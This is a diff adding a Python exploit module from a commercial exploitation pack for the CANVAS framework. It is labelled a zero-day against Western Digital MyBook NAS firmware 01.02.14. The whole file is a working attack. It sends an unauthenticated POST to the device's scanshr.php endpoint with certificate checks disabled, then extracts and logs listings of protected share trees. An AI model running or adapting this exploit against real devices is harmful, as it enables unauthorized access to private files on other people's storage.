@@ -1,0 +1,94 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import StringIO, urllib
+
+NAME = "d2sec_wdmybook_3"
+VERSION = "0.1"
+DESCRIPTION = "[0day] Western Digital NAS MyBook Information Disclosure Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "01.02.14"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = "List protected shares trees without authentication on Western Digital MyBook NAS"
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.setInfo(DESCRIPTION)
+    self.name = NAME
+    self.host = ''
+    self.port = 443
+    self.share = 'Configuration'
+	
+  def getargs(self):	
+    self.host = self.target.interface
+    self.share = self.argsDict.get("share",self.share)
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port)) 
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return 0
+    try:
+      data = "dir=/%s/&dev=nas"%self.share
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, 'https://%s/cpsync/scanshr.php' %self.host)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(c.SSL_VERIFYPEER, 0)
+      c.setopt(c.SSL_VERIFYHOST, 0)
+      c.setopt(pycurl.POST, 1)
+      c.setopt(pycurl.POSTFIELDS, data)
+      c.setopt(pycurl.WRITEFUNCTION, content.write)
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return 0
+    nfo = content.getvalue()
+    content.close()
+    nfo = re.findall(' rel=\"(.*?)\" ', nfo, re.DOTALL)
+    self.log('[D2] %s share listing'%self.share) 
+    self.log('\n'.join(nfo)) 
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target -O share:<share>" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
